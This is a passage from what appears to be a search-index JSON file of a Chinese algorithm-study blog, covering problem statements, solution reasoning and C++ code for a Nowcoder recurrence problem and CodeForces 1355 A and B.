Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#14-output","text":"\u6bcf\u7ec4\u6570\u636e\u8f93\u51fa\u4e00\u4e2a\u6570\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6b63\u6574\u6570 x \u7684\u4e2a\u6570\u53d6\u6a21 433494437\uff08\u5373\u7b54\u6848\u9700\u8981 %433494437\uff09","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#15-sample-input","text":"1 3","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#16-sample-output","text":"1 4","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#17-notes","text":"\u5f53 n=1 \u65f6\uff0c\u53ea\u6709 x=1 \u6ee1\u8db3\u6761\u4ef6\u3002 \u5f53 n=3 \u65f6\uff0c\u6709 x=1(001), x=2(010), x=4(100), x=5(101) \u51714\u79cd\u60c5\u51b5\u3002","title":"1.7. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#18-source","text":"\u725b\u5ba2\u7f51 NC200607 A-\u89e3\u9501\u4e13\u5bb6","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#2","text":"\u5c06\u524d\u51e0\u4e2a\u6570\u5b57\u5217\u51fa\u6765\uff0c\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u4e00\u5bf9\u6bd4\uff0c\u4f1a\u53d1\u73b0\u8fd9\u5c31\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u53d8\u5f62\u3002\u9012\u63a8\u65b9\u7a0b\u4e3a f(n) = f(n-1) + f(n-2) + 1 \uff0c\u521d\u59cb\u6761\u4ef6\u4e3a f(0) = 0 \uff0c f(1) = 1 \u3002 \\text{Table 1. \u6837\u4f8b\u6570\u636e\u5206\u6790} n \u4e8c\u8fdb\u5236\u6570\u4f4d \u7ed3\u679c \u6590\u6ce2\u90a3\u5951 1 (0)_B 1 1 2 (00)_B 2 1 3 (000)_B 4 3 4 (0000)_B 7 5 5 (00000)_B 12 8 6 (000000)_B 20 13 7 (0000000)_B 33 21 8 (00000000)_B 54 34","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200607_A-%E8%A7%A3%E9%94%81%E4%B8%93%E5%AE%B6/#3","text":"#include<iostream> #include<algorithm> const long long num = 1e2 + 1; using namespace std; long long list[num]; // \u901a\u8fc7\u9012\u63a8\u65b9\u7a0b\u8fdb\u884c\u8ba1\u7b97 void calculate(int n){ list[0] = 0; list[1] = 1; for(int i = 2; i <= n; i++){ list[i] = (list[i-1] + list[i-2] + 1)% 433494437; } } int main(){ long long n; long long ans = 0; calculate(num-1); // \u8f93\u5165 while(scanf(\"%lld\", &n) != EOF){ ans = list[n]; printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/","text":"CodeForces 1355 B. Young Explorers # \u76ee\u5f55 # CodeForces 1355 B. Young Explorers \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2 seconds Memory Limit: 256 megabytes 1.2. Problem Description # Young wilderness explorers set off to their first expedition led by senior explorer Russell. Explorers went into a forest, set up a camp and decided to split into groups to explore as much interesting locations as possible. Russell was trying to form groups, but ran into some difficulties... Most of the young explorers are inexperienced, and sending them alone would be a mistake. Even Russell himself became senior explorer not long ago. Each of young explorers has a positive integer parameter e_i \u2014 his inexperience. Russell decided that an explorer with inexperience e can only join the group of e or more people. Now Russell needs to figure out how many groups he can organize. It's not necessary to include every explorer in one of the groups: some can stay in the camp. Russell is worried about this expedition, so he asked you to help him. 1.3. Input # The first line contains the number of independent test cases T ( 1 \\leq T \\leq 2 \\cdot 10^5 ). Next 2T lines contain description of test cases. The first line of description of each test case contains the number of young explorers N ( 1 \\leq N \\leq 2 \\cdot 10^5 ). The second line contains N integers e_1, e_2, \\ldots, e_N ( 1 \\leq e_i \\leq N ), where e_i is the inexperience of the i -th explorer. It's guaranteed that sum of all N doesn't exceed 3 \\cdot 10^5 . 1.4. Output # Print T numbers, each number on a separate line. In i -th line print the maximum number of groups Russell can form in i -th test case. 1.5. Sample Input # 2 3 1 1 1 5 2 3 1 2 2 1.6. Sample Output # 3 2 1.7. Note # In the first example we can organize three groups. There will be only one explorer in each group. It's correct because inexperience of each explorer equals to 1 , so it's not less than the size of his group. In the second example we can organize two groups. Explorers with inexperience 1 , 2 and 3 will form the first group, and the other two explorers with inexperience equal to 2 will form the second group. This solution is not unique. For example, we can form the first group using the three explorers with inexperience equal to 2 , and the second group using only one explorer with inexperience equal to 1 . In this case the young explorer with inexperience equal to 3 will not be included in any group. 1.8. Source # CodeForces 1355 B. Young Explorers 2. \u89e3\u8bfb # \u9996\u5148\u8003\u8651\u6570\u636e\u8303\u56f4\uff0c\u4e00\u5171\u6709 T \u4e2a\u6d4b\u8bd5\u7528\u4f8b( 1 \\leq T \\leq 2 \\cdot 10^5 )\uff0c\u6bcf\u4e2a\u7528\u4f8b\u6709 N \u4e2a\u6570\u5b57 ( 1 \\leq N \\leq 2 \\cdot 10^5 )\u3002 \u5982\u679c\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u9700\u8981\u8fdb\u884c 2 \\cdot 10^5 \u6b21\u8fd0\u7b97\uff0c\u90a3\u4e48\u4e00\u5171\u9700\u8981\u8fdb\u884c 4 \\times 10^{10} \u6b21\u8fd0\u7b97\uff0c\u5bf9\u6bd4\u4e00\u822c\u7b14\u8bb0\u672c\u7535\u8111\u4e00\u79d2\u949f\u5927\u7ea6 10^7 \u6b21\u8fd0\u7b97\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u975e\u5e38\u5bb9\u6613\u8d85\u65f6\u3002 \u6211\u5728\u4e00\u5f00\u59cb\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u5728\u5faa\u73af\u4e2d\u52a0\u4e86\u4e00\u4e2a memset \u8bed\u53e5\u6765\u521d\u59cb\u5316\u6570\u7ec4\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u590d\u6742\u5ea6\u662f O(length) \u7684\uff0c\u8fd9\u91cc\u7684 length \u8868\u793a\u6570\u7ec4\u957f\u5ea6\uff0c\u5373 2 \\cdot 10^5 + 1 \uff0c\u7ed3\u679c\u5c31\u8d85\u65f6\u4e86\u3002 \u5728\u53bb\u6389 memset \u8bed\u53e5\u4ee5\u540e\uff0c\u5982\u679c\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u90fd\u5bf9\u8f93\u5165\u7684 n \u4e2a\u5143\u7d20\u8fdb\u884c\u4e00\u6b21\u904d\u5386\u8ba1\u7b97\uff0c\u4e5f\u80fd\u591f\u901a\u8fc7\uff0c\u5e94\u8be5\u662f\u6d4b\u8bd5\u7528\u4f8b\u6ca1\u6709\u6bcf\u4e2a N \u90fd\u8bbe\u7f6e\u5230 2 \\cdot 10^5 \u8fd9\u4e48\u5927\u3002\u4e0d\u8fc7\u8fd8\u662f\u63a8\u8350\u7701\u53bb\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u8ba1\u7b97\uff0c\u66f4\u52a0\u7a33\u59a5\u4e00\u4e9b\u3002 \u5728\u8bfb\u53d6\u8f93\u5165\u4ee5\u540e\uff0c\u5148\u5bf9 n \u4e2a\u6570\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u6392\u5e8f\uff0c\u5bf9 list[i] \u8fdb\u884c\u904d\u5386\uff0c\u7528 mark \u8868\u793a\u80fd\u591f\u7528\u6765\u7ec4\u5efa\u65b0\u961f\u4f0d\u7684\u4eba\u6570\uff0c mark \u521d\u59cb\u5316\u4e3a1\u3002 \u82e5 list[i] \\le mark \uff0c\u5219 ans = ans + 1 , mark = 1 \u3002 \u82e5 list[i] > mark \uff0c\u5219\u7528 buffer \u5b58\u50a8 list[i] - mark - 1 \uff0c mark = list[i] \uff0c i = i + buffer \uff0c\u8868\u793a\u76f4\u63a5\u4f7f\u7528\u540e\u9762\u7684\u4eba\u5bf9 list[i] \u961f\u4f0d\u8981\u6c42\u4eba\u6570\u8fdb\u884c\u8865\u5145\uff0c\u76f4\u5230\u961f\u4f0d\u4eba\u6570\u6ee1\u8db3 list[i] \u8981\u6c42\uff0c\u8df3\u8fc7\u4e2d\u95f4 buffer \u4e2a\u6570\uff0c\u8282\u7ea6\u4e86\u4e00\u4e9b\u8ba1\u7b97\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <string.h> const int num = 2 * 1e5 + 1; using namespace std; int list[num]; int main() { int t; int n, mark; long long ans; // test case scanf(\"%d\", &t); // for each test case while (t--) { scanf(\"%d\", &n); // \u521d\u59cb\u5316 ans = 0; mark = 1; // \u8fd9\u91cc\u4e0d\u80fd\u7528memset\uff0c\u4f1a\u8d85\u65f6 // memset(list, 0, sizeof(list)); // \u8f93\u5165 for (int i = 0; i < n; i++) { scanf(\"%d\", &list[i]); } // \u6392\u5e8f sort(list, list + n); // \u8ba1\u7b97 for (int i = 0; i < n; i++) { if (list[i] <= mark) { ans++; mark = 1; } else { // \u526a\u679d int buffer = list[i] - mark - 1; mark = list[i]; i += buffer; } } printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.CodeForces 1355 B Young Explorers"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#codeforces-1355-b-young-explorers","text":"","title":"CodeForces 1355 B. Young Explorers"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#_1","text":"CodeForces 1355 B. Young Explorers \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#11-limit","text":"Time Limit: 2 seconds Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#12-problem-description","text":"Young wilderness explorers set off to their first expedition led by senior explorer Russell. Explorers went into a forest, set up a camp and decided to split into groups to explore as much interesting locations as possible. Russell was trying to form groups, but ran into some difficulties... Most of the young explorers are inexperienced, and sending them alone would be a mistake. Even Russell himself became senior explorer not long ago. Each of young explorers has a positive integer parameter e_i \u2014 his inexperience. Russell decided that an explorer with inexperience e can only join the group of e or more people. Now Russell needs to figure out how many groups he can organize. It's not necessary to include every explorer in one of the groups: some can stay in the camp. Russell is worried about this expedition, so he asked you to help him.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#13-input","text":"The first line contains the number of independent test cases T ( 1 \\leq T \\leq 2 \\cdot 10^5 ). Next 2T lines contain description of test cases. The first line of description of each test case contains the number of young explorers N ( 1 \\leq N \\leq 2 \\cdot 10^5 ). The second line contains N integers e_1, e_2, \\ldots, e_N ( 1 \\leq e_i \\leq N ), where e_i is the inexperience of the i -th explorer. It's guaranteed that sum of all N doesn't exceed 3 \\cdot 10^5 .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#14-output","text":"Print T numbers, each number on a separate line. In i -th line print the maximum number of groups Russell can form in i -th test case.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#15-sample-input","text":"2 3 1 1 1 5 2 3 1 2 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#16-sample-output","text":"3 2","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#17-note","text":"In the first example we can organize three groups. There will be only one explorer in each group. It's correct because inexperience of each explorer equals to 1 , so it's not less than the size of his group. In the second example we can organize two groups. Explorers with inexperience 1 , 2 and 3 will form the first group, and the other two explorers with inexperience equal to 2 will form the second group. This solution is not unique. For example, we can form the first group using the three explorers with inexperience equal to 2 , and the second group using only one explorer with inexperience equal to 1 . In this case the young explorer with inexperience equal to 3 will not be included in any group.","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#18-source","text":"CodeForces 1355 B. Young Explorers","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#2","text":"\u9996\u5148\u8003\u8651\u6570\u636e\u8303\u56f4\uff0c\u4e00\u5171\u6709 T \u4e2a\u6d4b\u8bd5\u7528\u4f8b( 1 \\leq T \\leq 2 \\cdot 10^5 )\uff0c\u6bcf\u4e2a\u7528\u4f8b\u6709 N \u4e2a\u6570\u5b57 ( 1 \\leq N \\leq 2 \\cdot 10^5 )\u3002 \u5982\u679c\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u9700\u8981\u8fdb\u884c 2 \\cdot 10^5 \u6b21\u8fd0\u7b97\uff0c\u90a3\u4e48\u4e00\u5171\u9700\u8981\u8fdb\u884c 4 \\times 10^{10} \u6b21\u8fd0\u7b97\uff0c\u5bf9\u6bd4\u4e00\u822c\u7b14\u8bb0\u672c\u7535\u8111\u4e00\u79d2\u949f\u5927\u7ea6 10^7 \u6b21\u8fd0\u7b97\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u975e\u5e38\u5bb9\u6613\u8d85\u65f6\u3002 \u6211\u5728\u4e00\u5f00\u59cb\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u5728\u5faa\u73af\u4e2d\u52a0\u4e86\u4e00\u4e2a memset \u8bed\u53e5\u6765\u521d\u59cb\u5316\u6570\u7ec4\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u590d\u6742\u5ea6\u662f O(length) \u7684\uff0c\u8fd9\u91cc\u7684 length \u8868\u793a\u6570\u7ec4\u957f\u5ea6\uff0c\u5373 2 \\cdot 10^5 + 1 \uff0c\u7ed3\u679c\u5c31\u8d85\u65f6\u4e86\u3002 \u5728\u53bb\u6389 memset \u8bed\u53e5\u4ee5\u540e\uff0c\u5982\u679c\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u90fd\u5bf9\u8f93\u5165\u7684 n \u4e2a\u5143\u7d20\u8fdb\u884c\u4e00\u6b21\u904d\u5386\u8ba1\u7b97\uff0c\u4e5f\u80fd\u591f\u901a\u8fc7\uff0c\u5e94\u8be5\u662f\u6d4b\u8bd5\u7528\u4f8b\u6ca1\u6709\u6bcf\u4e2a N \u90fd\u8bbe\u7f6e\u5230 2 \\cdot 10^5 \u8fd9\u4e48\u5927\u3002\u4e0d\u8fc7\u8fd8\u662f\u63a8\u8350\u7701\u53bb\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u8ba1\u7b97\uff0c\u66f4\u52a0\u7a33\u59a5\u4e00\u4e9b\u3002 \u5728\u8bfb\u53d6\u8f93\u5165\u4ee5\u540e\uff0c\u5148\u5bf9 n \u4e2a\u6570\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u6392\u5e8f\uff0c\u5bf9 list[i] \u8fdb\u884c\u904d\u5386\uff0c\u7528 mark \u8868\u793a\u80fd\u591f\u7528\u6765\u7ec4\u5efa\u65b0\u961f\u4f0d\u7684\u4eba\u6570\uff0c mark \u521d\u59cb\u5316\u4e3a1\u3002 \u82e5 list[i] \\le mark \uff0c\u5219 ans = ans + 1 , mark = 1 \u3002 \u82e5 list[i] > mark \uff0c\u5219\u7528 buffer \u5b58\u50a8 list[i] - mark - 1 \uff0c mark = list[i] \uff0c i = i + buffer \uff0c\u8868\u793a\u76f4\u63a5\u4f7f\u7528\u540e\u9762\u7684\u4eba\u5bf9 list[i] \u961f\u4f0d\u8981\u6c42\u4eba\u6570\u8fdb\u884c\u8865\u5145\uff0c\u76f4\u5230\u961f\u4f0d\u4eba\u6570\u6ee1\u8db3 list[i] \u8981\u6c42\uff0c\u8df3\u8fc7\u4e2d\u95f4 buffer \u4e2a\u6570\uff0c\u8282\u7ea6\u4e86\u4e00\u4e9b\u8ba1\u7b97\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/1.CodeForces_1355_B_Young_Explorers/#3","text":"#include <algorithm> #include <iostream> #include <string.h> const int num = 2 * 1e5 + 1; using namespace std; int list[num]; int main() { int t; int n, mark; long long ans; // test case scanf(\"%d\", &t); // for each test case while (t--) { scanf(\"%d\", &n); // \u521d\u59cb\u5316 ans = 0; mark = 1; // \u8fd9\u91cc\u4e0d\u80fd\u7528memset\uff0c\u4f1a\u8d85\u65f6 // memset(list, 0, sizeof(list)); // \u8f93\u5165 for (int i = 0; i < n; i++) { scanf(\"%d\", &list[i]); } // \u6392\u5e8f sort(list, list + n); // \u8ba1\u7b97 for (int i = 0; i < n; i++) { if (list[i] <= mark) { ans++; mark = 1; } else { // \u526a\u679d int buffer = list[i] - mark - 1; mark = list[i]; i += buffer; } } printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/","text":"CodeForces 1355 A. Sequence with Digits # \u76ee\u5f55 # CodeForces 1355 A. Sequence with Digits \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2 seconds Memory Limit: 256 megabytes 1.2. Problem Description # Let's define the following recurrence: a_{n+1} = a_{n} + minDigit(a_{n}) \\cdot maxDigit(a_{n}) Here minDigit(x) and maxDigit(x) are the minimal and maximal digits in the decimal representation of x without leading zeroes. For examples refer to notes. Your task is calculate a_{K} for given a_{1} and K . 1.3. Input # The first line contains one integer t ( 1 \\le t \\le 1000 ) \u2014 the number of independent test cases. Each test case consists of a single line containing two integers a_{1} and K ( 1 \\le a_{1} \\le 10^{18} , 1 \\le K \\le 10^{16} ) separated by a space. 1.4. Output # For each test case print one integer a_{K} on a separate line. 1.5. Sample Input # 8 1 4 487 1 487 2 487 3 487 4 487 5 487 6 487 7 1.6. Sample Output # 42 487 519 528 544 564 588 628 1.7. Note # a_{1} = 487 a_{2} = a_{1} + minDigit(a_{1}) \\cdot maxDigit(a_{1}) = 487 + \\min (4, 8, 7) \\cdot \\max (4, 8, 7) = 487 + 4 \\cdot 8 = 519 a_{3} = a_{2} + minDigit(a_{2}) \\cdot maxDigit(a_{2}) = 519 + \\min (5, 1, 9) \\cdot \\max (5, 1, 9) = 519 + 1 \\cdot 9 = 528 a_{4} = a_{3} + minDigit(a_{3}) \\cdot maxDigit(a_{3}) = 528 + \\min (5, 2, 8) \\cdot \\max (5, 2, 8) = 528 + 2 \\cdot 8 = 544 a_{5} = a_{4} + minDigit(a_{4}) \\cdot maxDigit(a_{4}) = 544 + \\min (5, 4, 4) \\cdot \\max (5, 4, 4) = 544 + 4 \\cdot 5 = 564 a_{6} = a_{5} + minDigit(a_{5}) \\cdot maxDigit(a_{5}) = 564 + \\min (5, 6, 4) \\cdot \\max (5, 6, 4) = 564 + 4 \\cdot 6 = 588 a_{7} = a_{6} + minDigit(a_{6}) \\cdot maxDigit(a_{6}) = 588 + \\min (5, 8, 8) \\cdot \\max (5, 8, 8) = 588 + 5 \\cdot 8 = 628 1.8. Source # CodeForces 1355 A. Sequence with Digits 2. \u89e3\u8bfb # \u76f4\u63a5\u6839\u636e\u516c\u5f0f\u8fdb\u884c\u8ba1\u7b97 a_{n+1} = a_{n} + minDigit(a_{n}) \\cdot maxDigit(a_{n}) \u4f46\u662f\u8003\u8651\u5230\u6570\u636e\u8303\u56f4 ( 1 \\le a_{1} \\le 10^{18} , 1 \\le K \\le 10^{16} )\uff0c\u4e0d\u8fdb\u884c\u526a\u679d\u80af\u5b9a\u4f1a\u8d85\u65f6\u3002 \u6211\u4eec\u53ef\u4ee5\u6ce8\u610f\u5230\u4e00\u4e2a\u89c4\u5f8b\uff0c\u5c31\u662f\u5f53 minDigit(a_{n}) = 0 \u65f6\uff0c minDigit(a_{n}) \\cdot maxDigit(a_{n}) = 0 \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6211\u4eec\u5728\u6570\u5b57\u4e2d\u627e\u5230\u4e86\u4e00\u4e2a 0 \uff0c\u90a3\u4e48\u5c31\u4e0d\u518d\u9700\u8981\u8fdb\u884c\u8ba1\u7b97\uff0c\u76f4\u63a5\u8fd4\u56de 0 \u5373\u53ef\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> using namespace std; long long n, k; // \u8ba1\u7b97\u7ed3\u679c long long calculate(long long x) { long long minN = 10, maxX = 0; while (x) { // \u82e5\u627e\u52300\uff0c\u5219\u8fd4\u56de if (x % 10 == 0) { return 0; } else { minN = min(x % 10, minN); maxX = max(x % 10, maxX); } x /= 10; } return minN * maxX; } int main() { int t; scanf(\"%d\", &t); while (t--) { scanf(\"%lld %lld\", &n, &k); while (--k) { if (calculate(n) == 0) { break; } else { n += calculate(n); } } printf(\"%lld\\n\", n); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.CodeForces 1355 A Sequence with Digits"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#codeforces-1355-a-sequence-with-digits","text":"","title":"CodeForces 1355 A. Sequence with Digits"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#_1","text":"CodeForces 1355 A. Sequence with Digits \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. 